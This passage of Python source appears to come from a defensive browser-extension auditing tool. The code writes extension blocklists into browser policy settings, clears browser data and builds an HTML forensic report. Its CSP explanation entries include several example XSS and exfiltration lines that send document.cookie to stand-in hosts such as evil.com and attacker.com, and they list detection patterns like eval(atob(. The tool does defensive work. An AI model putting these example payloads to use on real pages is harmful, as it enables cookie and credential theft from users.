                $out = ($dict | ConvertTo-Json -Compress -Depth 10)
                $par.SetValue('RemedexBlocklistNames', $out, [Microsoft.Win32.RegistryValueKind]::String)
              }
            }
          }
        } finally { $par.Dispose() }
      }
    } catch {}
  } finally { $base.Dispose() }
}
foreach ($app in $apps) {
  foreach ($h in @([Microsoft.Win32.RegistryHive]::CurrentUser, [Microsoft.Win32.RegistryHive]::LocalMachine)) {
    Remove-BlockArtifacts -Hive $h -App $app
  }
}
exit 0
'''
        return self._windows_run_elevated_powershell(
            ps, json_payload={"ext_id": eid}
        )

    def _windows_elevated_clear_blocklists(self) -> bool:
        ps = r'''
$apps = @(
  'Google\Chrome',
  'Microsoft\Edge',
  'BraveSoftware\Brave',
  'BraveSoftware\Brave-Browser'
)
function Clear-OneHiveApp {
  param([Microsoft.Win32.RegistryHive]$Hive, [string]$App)
  $view = [Microsoft.Win32.RegistryView]::Registry64
  $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey($Hive, $view)
  try {
    $parentRel = "SOFTWARE\Policies\$App"
    $blRel = "$parentRel\ExtensionInstallBlocklist"
    try {
      $blk = $base.OpenSubKey($blRel, $true)
      if ($null -ne $blk) {
        try {
          foreach ($vn in @($blk.GetValueNames())) {
            try { $blk.DeleteValue($vn) } catch {}
          }
        } finally { $blk.Dispose() }
      }
    } catch {}
    try {
      $par0 = $base.OpenSubKey($parentRel, $true)
      if ($null -ne $par0) {
        try { $par0.DeleteSubKey('ExtensionInstallBlocklist', $false) } catch {}
        finally { $par0.Dispose() }
      }
    } catch {}
    try {
      $par = $base.OpenSubKey($parentRel, $true)
      if ($null -ne $par) {
        try {
          $raw = $null
          try { $raw = $par.GetValue('ExtensionSettings') } catch {}
          if ($null -ne $raw) {
            $jsonText = $raw.ToString().Trim()
            if (-not [string]::IsNullOrWhiteSpace($jsonText)) {
              $obj = $jsonText | ConvertFrom-Json
              $dict = @{}
              if ($null -ne $obj) { $obj.PSObject.Properties | ForEach-Object { $dict[$_.Name] = $_.Value } }
              $toDel = @()
              foreach ($k in @($dict.Keys)) {
                $v = $dict[$k]
                $im = $null
                if ($v -is [hashtable]) { $im = $v['installation_mode'] }
                elseif ($null -ne $v) {
                  try { $im = $v.installation_mode } catch {}
                }
                if ($im -eq 'blocked') { $toDel += $k }
              }
              foreach ($k in $toDel) { [void]$dict.Remove($k) }
              if ($dict.Count -eq 0) {
                try { $par.DeleteValue('ExtensionSettings') } catch {}
              } else {
                $out = ($dict | ConvertTo-Json -Compress -Depth 10)
                $par.SetValue('ExtensionSettings', $out, [Microsoft.Win32.RegistryValueKind]::String)
              }
            }
          }
          try { $par.DeleteValue('RemedexBlocklistNames') } catch {}
        } finally { $par.Dispose() }
      }
    } catch {}
  } finally { $base.Dispose() }
}
foreach ($app in $apps) {
  foreach ($h in @([Microsoft.Win32.RegistryHive]::CurrentUser, [Microsoft.Win32.RegistryHive]::LocalMachine)) {
    Clear-OneHiveApp -Hive $h -App $app
  }
}
exit 0
'''
        return self._windows_run_elevated_powershell(ps, json_payload=None)

    def _apply_policy_blocklist_tasks(
        self,
        tasks: List[Tuple[str, str, Optional[str]]],
        allow_elevation: bool = True,
    ) -> List[CleanupResult]:
        """Apply blocklist + ExtensionSettings; on Windows, one UAC for all denied writes."""
        ordered = _dedupe_policy_tasks_with_names(tasks)
        if not ordered:
            return []
        if sys.platform != "win32":
            return [self._add_to_policy_blocklist(b, e, n) for b, e, n in ordered]

        results: List[CleanupResult] = []
        pending_idx: List[int] = []
        for i, (b, e, n) in enumerate(ordered):
            r = self._add_to_policy_blocklist(b, e, n)
            results.append(r)
            if not r.success and _needs_windows_policy_elevation(r):
                pending_idx.append(i)

        if pending_idx and allow_elevation:
            need = [ordered[i] for i in pending_idx]
            el = self._windows_elevated_policies_batch(need)
            if el.success:
                for i in pending_idx:
                    b, e, n = ordered[i]
                    results[i] = CleanupResult(
                        True,
                        "policy_blocklist",
                        f"Blocked {e} via policy (Administrator / UAC) (blocklist + ExtensionSettings)",
                        1,
                    )
            else:
                detail = el.details or "Elevated policy write failed"
                for i in pending_idx:
                    results[i] = CleanupResult(False, "policy_blocklist", detail, 0)
        return results

    def _add_to_policy_blocklist(
        self, browser: str, ext_id: str, display_name: Optional[str] = None
    ) -> CleanupResult:
        """Add an extension ID to the browser's enterprise policy blocklist."""
        bkey = str(browser).lower().strip()
        if sys.platform == "win32":
            bases = self._windows_policy_reg_bases(bkey)
            if not bases:
                return CleanupResult(False, "policy_blocklist", f"No policy path for {browser!r}")
            any_ok = False
            total_new = 0
            last_err: Optional[OSError] = None
            for reg_base in bases:
                ok, added, err = self._windows_policy_apply_blocklist_one_base(
                    reg_base, ext_id, display_name)
                if ok:
                    any_ok = True
                    total_new += added
                if err:
                    last_err = err
            if any_ok:
                ir = 1 if total_new > 0 else 0
                msg = (
                    f"Blocked {ext_id} via policy (blocklist + ExtensionSettings)"
                    if total_new > 0
                    else f"{ext_id} already in policy blocklist"
                )
                return CleanupResult(True, "policy_blocklist", msg, ir)
            diag = self.policy_blocklist_registry_status_windows(bkey)
            err_line = f"Could not write policy blocklist: {last_err!s}\n" if last_err else ""
            wn = getattr(last_err, "winerror", None) if last_err else None
            return CleanupResult(False, "policy_blocklist",
                err_line + "Tried HKCU then HKLM. Use batch elevation from removal flow if Access Denied.\n"
                + diag, 0, wn)

        elif sys.platform == "darwin":
            domain = self.BROWSER_POLICY_MAC_DOMAIN.get(bkey)
            if not domain:
                return CleanupResult(False, "policy_blocklist", f"No policy domain for {browser!r}")
            existing = []
            try:
                r = subprocess.run(["defaults", "read", domain, "ExtensionInstallBlocklist"],
                                   capture_output=True, text=True)
                if r.returncode == 0:
                    for line in r.stdout.strip().split("\n"):
                        val = line.strip().strip(",").strip('"').strip("'").strip()
                        if val and val not in ("(", ")"):
                            existing.append(val)
            except Exception:
                pass
            if ext_id in existing:
                return CleanupResult(True, "policy_blocklist",
                    f"{ext_id} already in policy blocklist", 0)
            existing.append(ext_id)
            subprocess.run(["defaults", "write", domain,
                            "ExtensionInstallBlocklist", "-array"] + existing, check=True)
            self.log(f"  Added {ext_id} to {domain} policy blocklist")
            return CleanupResult(True, "policy_blocklist",
                f"Blocked {ext_id} via macOS managed preferences", 1)

        else:
            policy_dir = Path(self.BROWSER_POLICY_LINUX_DIR.get(bkey, ""))
            if not str(policy_dir):
                return CleanupResult(False, "policy_blocklist", f"No policy path for {browser!r}")
            policy_dir.mkdir(parents=True, exist_ok=True)
            policy_file = policy_dir / "remedex_blocklist.json"
            policy = {}
            if policy_file.exists():
                try:
                    with open(policy_file, 'r') as f:
                        policy = json.load(f)
                except Exception:
                    pass
            blocklist = policy.get("ExtensionInstallBlocklist", [])
            if ext_id in blocklist:
                return CleanupResult(True, "policy_blocklist",
                    f"{ext_id} already in policy blocklist", 0)
            blocklist.append(ext_id)
            policy["ExtensionInstallBlocklist"] = blocklist
            with open(policy_file, 'w') as f:
                json.dump(policy, f, indent=2)
            self.log(f"  Added {ext_id} to policy file: {policy_file}")
            return CleanupResult(True, "policy_blocklist",
                f"Blocked {ext_id} via policy file", 1)

    def disable_extension_sync(self, extension: Extension) -> CleanupResult:
        """Block a removed extension from re-installation using OS-level enterprise policies.
        
        Uses ExtensionInstallBlocklist policy:
        - Windows: Registry under HKLM/HKCU SOFTWARE\\Policies\\{browser}
        - macOS:   Managed preferences via `defaults write`
        - Linux:   JSON policy file in /etc/opt/{browser}/policies/managed/
        """
        try:
            rs = self._apply_policy_blocklist_tasks(
                [
                    (
                        extension.browser,
                        extension.id,
                        self._display_name_for_blocklist_policy(extension),
                    )
                ],
                allow_elevation=True,
            )
            return rs[0] if rs else CleanupResult(False, "disable_sync", "No policy result")
        except Exception as e:
            return CleanupResult(False, "disable_sync", str(e))

    def disable_all_extension_sync(self, browser: str = None) -> List[CleanupResult]:
        """Disable extension sync entirely via enterprise policy (SyncTypesListDisabled)."""
        results = []
        browsers = [browser] if browser else ["chrome", "edge", "brave"]

        for b in browsers:
            try:
                if sys.platform == "win32":
                    import winreg
                    reg_base = self.BROWSER_POLICY_REGISTRY.get(b)
                    if not reg_base:
                        continue
                    for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                        try:
                            key = winreg.CreateKeyEx(hive, reg_base, 0, _winreg_policy_access_write())
                            winreg.SetValueEx(key, "SyncDisabled", 0, winreg.REG_DWORD, 1)
                            winreg.CloseKey(key)
                            hive_name = "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU"
                            self.log(f"Disabled sync for {b} via {hive_name} policy")
                            results.append(CleanupResult(True, "disable_sync",
                                f"Disabled sync: {b} ({hive_name})", 1))
                            break
                        except OSError:
                            continue
                    else:
                        results.append(CleanupResult(False, "disable_sync",
                            f"Insufficient permissions for {b} policy (run as admin)"))

                elif sys.platform == "darwin":
                    domain = self.BROWSER_POLICY_MAC_DOMAIN.get(b)
                    if not domain:
                        continue
                    subprocess.run(["defaults", "write", domain,
                                    "SyncDisabled", "-bool", "true"], check=True)
                    self.log(f"Disabled sync for {b} via macOS managed preferences")
                    results.append(CleanupResult(True, "disable_sync",
                        f"Disabled sync: {b} (macOS policy)", 1))

                else:
                    policy_dir = Path(self.BROWSER_POLICY_LINUX_DIR.get(b, ""))
                    if not str(policy_dir):
                        continue
                    policy_dir.mkdir(parents=True, exist_ok=True)
                    policy_file = policy_dir / "remedex_sync.json"
                    policy = {}
                    if policy_file.exists():
                        try:
                            with open(policy_file, 'r') as f:
                                policy = json.load(f)
                        except Exception:
                            pass
                    policy["SyncDisabled"] = True
                    with open(policy_file, 'w') as f:
                        json.dump(policy, f, indent=2)
                    self.log(f"Disabled sync for {b} via policy file: {policy_file}")
                    results.append(CleanupResult(True, "disable_sync",
                        f"Disabled sync: {b} (policy file)", 1))

            except Exception as e:
                results.append(CleanupResult(False, "disable_sync", str(e)))

        return results
    
    def clean_localstorage(self, profile: BrowserProfile, domains: List[str] = None) -> CleanupResult:
        """Clean localStorage - all or specific domains"""
        storage_path = profile.path / "Local Storage" / "leveldb"

        if not storage_path.exists():
            return CleanupResult(True, "clean_localstorage", "No localStorage found", 0)

        try:
            # Full clear: remove the directory
            if storage_path.is_dir():
                shutil.rmtree(storage_path)
                storage_path.mkdir(parents=True, exist_ok=True)
            else:
                storage_path.unlink()

            self.log(f"Cleared localStorage for {profile.browser}/{profile.name}")
            return CleanupResult(True, "clean_localstorage", "Cleared localStorage", 1)
        except Exception as e:
            return CleanupResult(False, "clean_localstorage", str(e))
    
    def clean_service_workers(self, profile: BrowserProfile) -> CleanupResult:
        """Remove all service worker registrations"""
        sw_path = profile.path / "Service Worker"
        
        if not sw_path.exists():
            return CleanupResult(True, "clean_service_workers", "No service workers found", 0)
        
        try:
            if sw_path.is_dir():
                shutil.rmtree(sw_path)
                sw_path.mkdir(parents=True, exist_ok=True)
            else:
                sw_path.unlink()
            
            self.log(f"Cleared service workers for {profile.browser}/{profile.name}")
            return CleanupResult(True, "clean_service_workers", "Removed service workers", 1)
        except Exception as e:
            return CleanupResult(False, "clean_service_workers", str(e))
    
    def clean_cache(self, profile: BrowserProfile) -> CleanupResult:
        """Clear browser cache"""
        cache_paths = [
            profile.path / "Cache",
            profile.path / "Code Cache",
            profile.path / "GPUCache",
            profile.path / "ShaderCache",
        ]
        
        items_removed = 0
        for cache_path in cache_paths:
            if cache_path.exists():
                try:
                    shutil.rmtree(cache_path)
                    cache_path.mkdir(parents=True, exist_ok=True)
                    items_removed += 1
                except Exception:
                    pass
        
        if items_removed > 0:
            self.log(f"Cleared cache for {profile.browser}/{profile.name}")
            return CleanupResult(True, "clean_cache",
                f"Cleared {items_removed} cache directories", items_removed)
        
        return CleanupResult(True, "clean_cache", "No cache to clear", 0)
    
    def clean_cookies(self, profile: BrowserProfile, domains: List[str] = None) -> CleanupResult:
        """Remove cookies - all or for specific domains"""
        cookies_path = profile.path / "Network" / "Cookies"
        if not cookies_path.exists():
            cookies_path = profile.path / "Cookies"

        if not cookies_path.exists():
            return CleanupResult(True, "clean_cookies", "No cookies file found", 0)

        try:
            if domains:
                conn = sqlite3.connect(str(cookies_path))
                cursor = conn.cursor()
                items_removed = 0
                for domain in domains:
                    try:
                        cursor.execute(
                            "DELETE FROM cookies WHERE host_key LIKE ?",
                            (f"%{domain}%",)
                        )
                        items_removed += cursor.rowcount
                    except Exception:
                        pass
                conn.commit()
                conn.close()
                return CleanupResult(True, "clean_cookies",
                    f"Removed {items_removed} cookies", items_removed)
            cookies_path.unlink()
            self.log(f"Cleared all cookies for {profile.browser}/{profile.name}")
            return CleanupResult(True, "clean_cookies", "Cleared all cookies", 1)
        except Exception as e:
            return CleanupResult(False, "clean_cookies", str(e))
    
    def clean_profile(self, profile: BrowserProfile, 
                     clean_storage: bool = True,
                     clean_sw: bool = True,
                     clean_cache: bool = True,
                     clean_cookies: bool = False,
                     domains: List[str] = None) -> List[CleanupResult]:
        """Clean various data from a browser profile"""
        results = []
        
        if clean_storage:
            results.append(self.clean_localstorage(profile, domains))
        
        if clean_sw:
            results.append(self.clean_service_workers(profile))
        
        if clean_cache:
            results.append(self.clean_cache(profile))
        
        if clean_cookies:
            results.append(self.clean_cookies(profile, domains))
        
        return results
    
    def clean_all_browsers(self, browsers: List[str] = None, **kwargs) -> List[CleanupResult]:
        """Clean all browser profiles"""
        results = []
        browser_paths = self.get_browser_paths()
        
        if browsers:
            browser_paths = {k: v for k, v in browser_paths.items() if k in browsers}
        
        running = [b for b in browser_paths.keys() if self.check_browser_running(b)]
        if running:
            self.log(f"Closing running browsers: {', '.join(running)}")
            failed = [b for b in running if not self.close_browser(b)]
            if failed:
                return [CleanupResult(False, "check_browsers",
                    f"Could not close browsers: {', '.join(failed)}")]
        
        for browser, paths in browser_paths.items():
            for browser_path in paths:
                profiles = self.get_profiles(browser_path, browser)
                
                for profile in profiles:
                    self.log(f"Cleaning {browser}/{profile.name}...")
                    profile_results = self.clean_profile(profile, **kwargs)
                    results.extend(profile_results)
        
        return results
    
    def format_extension_list(self, extensions: List[Extension] = None, 
                             show_details: bool = False) -> str:
        """Format extension list for display"""
        if extensions is None:
            extensions = self.extensions_cache
        
        if not extensions:
            return "No extensions found."
        
        # Group by browser/profile
        grouped = {}
        for ext in extensions:
            key = f"{ext.browser}/{ext.profile}"
            if key not in grouped:
                grouped[key] = []
            grouped[key].append(ext)
        
        output = []
        for key, exts in sorted(grouped.items()):
            output.append(f"\n{'='*60}")
            output.append(f" {key.upper()}")
            output.append('='*60)
            
            for ext in sorted(exts, key=lambda x: x.name.lower()):
                status = "" if ext.is_enabled else " [DISABLED]"
                risk = ext.calculate_risk_level()
                risk_tag = {"critical": " [CRITICAL]", "high": " [HIGH]", "medium": " [MEDIUM]", "trusted": " [TRUSTED]"}.get(risk, "")
                
                output.append(f"\n  {ext.name}{status}{risk_tag}")
                output.append(f"  ID: {ext.id}")
                output.append(f"  Version: {ext.version}")
                
                if show_details:
                    if ext.description:
                        output.append(f"  Description: {ext.description}")
                    wm = getattr(ext, 'webstore_meta', {})
                    if wm and not wm.get("error"):
                        meta_bits = []
                        if "users_display" in wm:
                            label = wm["users_display"]
                            if wm.get("users", 0) < 1000:
                                label += " (LOW ADOPTION)"
                            meta_bits.append(label)
                        if "rating" in wm:
                            meta_bits.append(f"{wm['rating']}/5 ({wm.get('rating_count','?')} ratings)")
                        if wm.get("featured"):
                            meta_bits.append("Featured (Google-vetted)")
                        if meta_bits:
                            output.append(f"  Web Store:   {' | '.join(meta_bits)}")
                        if wm.get("store_url"):
                            output.append(f"  Store URL:   {wm['store_url']}")
                    if ext.permissions:
                        output.append(f"  Permissions: {', '.join(ext.permissions[:5])}")
                        if len(ext.permissions) > 5:
                            output.append(f"               +{len(ext.permissions)-5} more")
                    if ext.host_permissions:
                        output.append(f"  Host Access: {', '.join(ext.host_permissions[:3])}")
                        if len(ext.host_permissions) > 3:
                            output.append(f"               +{len(ext.host_permissions)-3} more")
                    if ext.csp_issues:
                        output.append(f"  CSP Issues:  {len(ext.csp_issues)} problem(s) found")
                        for ci in ext.csp_issues[:3]:
                            output.append(f"               • {ci}")
                        if len(ext.csp_issues) > 3:
                            output.append(f"               +{len(ext.csp_issues)-3} more")
                    if ext.sri_issues:
                        output.append(f"  SRI Issues:  {len(ext.sri_issues)} external resource(s) without integrity hash")
                    output.append(f"  Path: {ext.path}")
        
        output.append(f"\n{'='*60}")
        output.append(f" Total: {len(extensions)} extensions")
        output.append('='*60)
        
        return '\n'.join(output)
    
    def download_extension(self, extension_id: str, output_dir: str = None,
                          extract: bool = False) -> Dict[str, Any]:
        """Download an extension from Chrome Web Store"""
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library required. Install with: pip install requests")
        
        download_dir = output_dir or "./downloaded_extensions"
        downloader = ExtensionDownloader(output_dir=download_dir, verbose=self.verbose)
        
        return downloader.download(extension_id, extract=extract)
    
    def download_installed_extension(self, extension: Extension, output_dir: str = None) -> Dict[str, Any]:
        """Copy an installed extension to a directory for analysis"""
        download_dir = Path(output_dir or "./downloaded_extensions")
        download_dir.mkdir(parents=True, exist_ok=True)
        
        output_path = download_dir / f"{extension.id}_{extension.name.replace(' ', '_')}"
        
        if extension.path.exists():
            # Chromium: store layout is <id>/<version>/ or unpacked flat folder
            versions = [v for v in extension.path.iterdir() if v.is_dir()]
            if versions:
                latest = sorted(versions, key=lambda x: x.name)[-1]
                shutil.copytree(latest, output_path, dirs_exist_ok=True)
                shutil.make_archive(str(output_path), 'zip', latest)
            else:
                shutil.copytree(extension.path, output_path, dirs_exist_ok=True)

            self.log(f"Copied extension to: {output_path}")
            
            # Read manifest
            manifest = None
            manifest_path = output_path / "manifest.json"
            if manifest_path.exists():
                try:
                    with open(manifest_path, 'r', encoding='utf-8') as f:
                        manifest = json.load(f)
                except:
                    pass
            
            return {
                "extension_id": extension.id,
                "name": extension.name,
                "output_dir": str(output_path),
                "manifest": manifest,
            }
        else:
            raise FileNotFoundError(f"Extension path not found: {extension.path}")
    
    _HEURISTIC_EXPLANATIONS = {
        "dynamic script injection": (
            "The extension creates <code>&lt;script&gt;</code> elements at runtime and injects them into web pages. "
            "This is a common technique used by malicious extensions to load remote code that wasn't present "
            "during Chrome Web Store review, effectively bypassing Google's security checks."
        ),
        "obfuscated eval(atob(": (
            "The code decodes a Base64-encoded string and immediately executes it with <code>eval()</code>. "
            "This is a strong indicator of hidden payloads — legitimate extensions rarely need to hide their code. "
            "Attackers use this to conceal data exfiltration, credential theft, or ad injection logic."
        ),
        "ethereum": (
            "A hardcoded cryptocurrency wallet address was found in the source code. "
            "This may indicate a cryptojacking extension that secretly mines cryptocurrency, "
            "replaces wallet addresses on web pages, or performs clipboard hijacking."
        ),
    }

    _HOST_PERM_EXPLANATIONS = {
        "*://*/*": "Full access to ALL websites over both HTTP and HTTPS. The extension can read and modify every page you visit.",
        "<all_urls>": "Identical to *://*/* — grants access to every URL. The extension can see and alter all your browsing.",
        "http://*/*": "Access to all websites over insecure HTTP. Can read/modify any non-HTTPS page.",
        "https://*/*": "Access to all websites over HTTPS. Can read/modify any secure page you visit.",
        "file:///*": "Access to local files on your computer opened in the browser (file:// URLs).",
        "ftp://*/*": "Access to FTP sites opened in the browser.",
    }

    _CONTENT_SCRIPT_EXPLANATIONS = {
        "*://*/*": "Runs on EVERY website you visit (HTTP and HTTPS). The script is injected into all pages.",
        "<all_urls>": "Runs on every URL — equivalent to *://*/*.",
        "http://*/*": "Runs on all HTTP (non-secure) pages.",
        "https://*/*": "Runs on all HTTPS (secure) pages.",
    }

    _CSP_ISSUE_EXPLANATIONS = {
        "unsafe-eval": {
            "risk": "HIGH",
            "why": "Allows <code>eval()</code>, <code>new Function()</code>, and <code>setTimeout('string')</code> to execute arbitrary strings as code. "
                   "If an attacker can inject a string into any variable that reaches these functions, they achieve full code execution inside the extension.",
            "attack": "An XSS payload or a compromised API response could contain: <code>eval('fetch(\"https://evil.com/steal?c=\"+document.cookie)')</code> "
                      "— and the extension would execute it because <code>'unsafe-eval'</code> permits it.",
            "fix": "Remove <code>'unsafe-eval'</code> and refactor code to avoid <code>eval()</code>. Use structured data (JSON.parse) instead of evaluating strings.",
        },
        "unsafe-inline": {
            "risk": "HIGH",
            "why": "Allows inline <code>&lt;script&gt;</code> blocks, <code>javascript:</code> URIs, and inline event handlers (<code>onclick</code>, etc.) to run. "
                   "This defeats one of CSP's main protections — preventing injected scripts from executing.",
            "attack": "An attacker who can inject HTML into the extension's page could add: "
                      "<code>&lt;img src=x onerror=\"fetch('https://evil.com/?d='+document.cookie)\"&gt;</code> "
                      "— the inline handler executes because <code>'unsafe-inline'</code> allows it.",
            "fix": "Remove <code>'unsafe-inline'</code>. Move all JavaScript into external <code>.js</code> files and use CSP nonces or hashes if inline scripts are truly required.",
        },
        "wildcard": {
            "risk": "CRITICAL",
            "why": "A wildcard <code>*</code> in <code>script-src</code> or <code>default-src</code> means the extension will load and execute scripts from <strong>any origin on the internet</strong>. "
                   "This completely negates the purpose of having a Content Security Policy.",
            "attack": "An attacker can host a malicious script on any domain and trick the extension into loading it: "
                      "<code>&lt;script src=\"https://attacker.com/payload.js\"&gt;&lt;/script&gt;</code> — the wildcard CSP allows it.",
            "fix": "Replace <code>*</code> with specific trusted origins, e.g. <code>script-src 'self' https://trusted-cdn.com</code>.",
        },
        "http:": {
            "risk": "HIGH",
            "why": "Allowing scripts to load over plain <code>http:</code> (no TLS) means a man-in-the-middle attacker on the network can intercept and replace the script with malicious code. "
                   "This is especially dangerous on public Wi-Fi or compromised networks.",
            "attack": "A network attacker intercepts the HTTP request for <code>http://cdn.example.com/lib.js</code> and injects: "
                      "<code>fetch('https://evil.com/exfil?cookies='+document.cookie)</code> — the extension runs the tampered script.",
            "fix": "Change all <code>http:</code> sources to <code>https:</code>. Never load executable code over unencrypted connections.",
        },
        "external domains": {
            "risk": "MEDIUM",
            "why": "The CSP allows loading scripts from third-party domains. If any of those domains are compromised, expired, or re-registered by an attacker, "
                   "they can serve malicious JavaScript that executes with full extension privileges (access to tabs, cookies, browsing data, etc.).",
            "attack": "A supply-chain attack: the external domain <code>cdn.some-analytics.com</code> gets compromised, and the attacker replaces the hosted script "
                      "with a credential stealer — the extension loads and executes it automatically.",
            "fix": "Use Sub-Resource Integrity (SRI) hashes to pin the expected content, or bundle the scripts locally within the extension.",
        },
        "no csp": {
            "risk": "MEDIUM",
            "why": "Manifest V2 extensions without an explicit CSP get a permissive default (<code>script-src 'self' 'unsafe-eval'; object-src 'self'</code>). "
                   "This default allows <code>eval()</code> and similar dynamic code execution, making code injection easier if an attacker finds an XSS vector.",
            "attack": "Without a strict CSP, any XSS vulnerability in the extension's HTML pages can escalate to full code execution — "
                      "the attacker can run <code>eval()</code> with the extension's elevated permissions.",
            "fix": "Add an explicit CSP to <code>manifest.json</code>: <code>\"content_security_policy\": \"script-src 'self'; object-src 'self'\"</code>",
        },
    }

    def generate_html_report(self, extensions, filepath: str, vt_results: Dict = None) -> bool:
        """Generate an interactive HTML forensic report with explanations and collapsible sections"""
        try:
            import html as html_mod
            ext_count = len(extensions)
            risk_counts = {}
            for ext in extensions:
                lvl = ext.calculate_risk_level()
                risk_counts[lvl] = risk_counts.get(lvl, 0) + 1

            summary_pills = []
            for lvl, color in [("critical", "#c0392b"), ("high", "#d68910"), ("medium", "#7d6608"), ("low", "#2980b9"), ("safe", "#27ae60"), ("trusted", "#27ae60")]:
                if risk_counts.get(lvl, 0) > 0:
                    summary_pills.append(f"<span class='summary-pill' style='background:{color}22;color:{color};border:1px solid {color}'>{risk_counts[lvl]} {lvl.upper()}</span>")

            html = [
                "<!DOCTYPE html><html><head><meta charset='utf-8'><title>RemedeX — Forensic Report</title>",
                "<style>",
                "* { box-sizing: border-box; }",
                "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px 30px; line-height: 1.6; color: #333; background: #f5f7fa; }",
                "h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; margin-bottom: 5px; }",
                ".report-meta { font-size: 0.9em; color: #666; margin-bottom: 20px; }",
                ".summary-pills { margin: 10px 0 20px; }",
                ".summary-pill { display: inline-block; padding: 4px 12px; border-radius: 14px; font-size: 0.85em; font-weight: 700; margin-right: 6px; }",
                ".extension-card { background: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-left: 5px solid #2ecc71; transition: box-shadow 0.2s; }",
                ".extension-card:hover { box-shadow: 0 6px 12px rgba(0,0,0,0.15); }",
                ".extension-card.warning { border-left-color: #f39c12; }",
                ".extension-card.danger { border-left-color: #e74c3c; }",
                ".extension-card.trusted { border-left-color: #27ae60; background: #f0faf0; }",
                ".header { display: flex; justify-content: space-between; align-items: baseline; flex-wrap: wrap; }",
                ".id { font-family: monospace; color: #7f8c8d; background: #ecf0f1; padding: 2px 6px; border-radius: 4px; font-size: 0.85em; }",
                ".meta { font-size: 0.9em; color: #555; margin-bottom: 10px; }",
                ".section { margin-top: 15px; }",
                ".section-header { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }",
                ".section-title { font-weight: bold; color: #2c3e50; font-size: 0.95em; text-transform: uppercase; margin: 0; }",
                ".section-desc { font-size: 0.82em; color: #777; font-style: italic; margin: 0 0 8px; line-height: 1.4; }",
                ".pill { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 0.85em; font-weight: 600; margin: 2px; }",
                ".heuristic { background: #fadbd8; color: #c0392b; }",
                ".dnr { background: #fcf3cf; color: #d68910; }",
                ".vt-clean { background: #d5f5e3; color: #1e8449; }",
                ".vt-flagged { background: #fadbd8; color: #c0392b; }",
                ".host-perm { background: #fdebd0; color: #935116; }",
                ".explain { font-size: 0.82em; color: #666; margin: 4px 0 2px 10px; padding: 6px 10px; background: #f9f9f9; border-left: 3px solid #3498db; border-radius: 0 4px 4px 0; line-height: 1.4; }",
                ".heuristic-explain { border-left-color: #e74c3c; background: #fef5f5; }",
                "table.data-table { width: 100%; border-collapse: collapse; margin-top: 5px; font-size: 0.9em; text-align: left; }",
                "table.data-table th { padding: 8px; border: 1px solid #bdc3c7; background: #ecf0f1; font-weight: 600; }",
                "table.data-table td { padding: 8px; border: 1px solid #bdc3c7; vertical-align: top; }",
                ".collapsible { cursor: pointer; user-select: none; }",
                ".collapsible::before { content: '\\25B6'; display: inline-block; margin-right: 6px; font-size: 0.7em; transition: transform 0.2s; }",
                ".collapsible.open::before { transform: rotate(90deg); }",
                ".collapse-content { display: none; }",
                ".collapse-content.open { display: block; }",
                ".badge-count { display: inline-block; background: #3498db; color: white; font-size: 0.75em; padding: 1px 7px; border-radius: 10px; margin-left: 6px; font-weight: 600; }",
                ".pattern-badge { font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 2px 8px; border-radius: 4px; font-size: 0.82em; }",
                "a { color: #3498db; text-decoration: none; }",
                "a:hover { text-decoration: underline; }",
                ".risk-meter { display: inline-block; width: 80px; height: 8px; background: #ecf0f1; border-radius: 4px; vertical-align: middle; margin-left: 8px; overflow: hidden; }",
                ".risk-meter-fill { height: 100%; border-radius: 4px; transition: width 0.3s; }",
                ".legend-box { background: white; border-radius: 8px; padding: 16px 20px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.08); }",
                ".legend-box h3 { margin: 0 0 8px; font-size: 0.95em; color: #2c3e50; }",
                ".legend-box p { margin: 4px 0; font-size: 0.85em; color: #555; }",
                "</style>",
                "<script>",
                "function toggleCollapse(id) {",
                "  var el = document.getElementById(id);",
                "  var btn = document.getElementById('btn-'+id);",
                "  if (el.classList.contains('open')) { el.classList.remove('open'); btn.classList.remove('open'); }",
                "  else { el.classList.add('open'); btn.classList.add('open'); }",
                "}",
                "</script>",
                "</head><body>",
                f"<h1>RemedeX — Browser Extension Forensic Report</h1>",
                f"<div class='report-meta'>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Extensions analyzed: {ext_count}</div>",
                f"<div class='summary-pills'>{' '.join(summary_pills)}</div>",
                "<div class='legend-box'>",
                "<h3>How to Read This Report</h3>",
                "<p><strong>Risk Score (0-100):</strong> Computed from permissions, heuristic analysis, network indicators, and Web Store metadata. "
                "SAFE = 0 | LOW = 1-25 | MEDIUM = 26-50 | HIGH = 51-75 | CRITICAL = 76+ | TRUSTED = known safe extension (e.g. built-in browser component)</p>",
                "<p><strong>API Permissions:</strong> Chrome extension APIs the extension has access to. High-risk permissions (like <code>webRequest</code>, "
                "<code>cookies</code>, <code>debugger</code>) can be abused for data theft or traffic interception.</p>",
                "<p><strong>Host Permissions:</strong> Which websites the extension can read and modify. Patterns like <code>*://*/*</code> mean ALL sites.</p>",
                "<p><strong>Content Scripts:</strong> JavaScript injected into matching web pages. If the match pattern is <code>&lt;all_urls&gt;</code> or <code>*://*/*</code>, "
                "the script runs on every page you visit.</p>",
                "<p><strong>Domain/IP Extractions:</strong> Domains and IP addresses found hardcoded in the extension's source files — potential C2 servers, analytics endpoints, or ad networks. "
                "<em>Extracted via regex pattern matching on decoded JS/HTML source; highly obfuscated scripts may contain additional network IOCs not captured here.</em></p>",
                "<p><strong>Heuristic Warnings:</strong> Suspicious code patterns detected by static analysis (obfuscation, dynamic script injection, crypto addresses).</p>",
                "<p><strong>CSP Issues:</strong> Content Security Policy weaknesses found in the manifest. A missing or weak CSP (<code>unsafe-eval</code>, <code>unsafe-inline</code>, wildcard sources, "
                "http: origins, external script domains) can allow attackers to inject and execute arbitrary code within the extension's context.</p>",
                "<p><strong>SRI Issues:</strong> External scripts/stylesheets loaded without a <code>integrity</code> hash. Without Sub-Resource Integrity, "
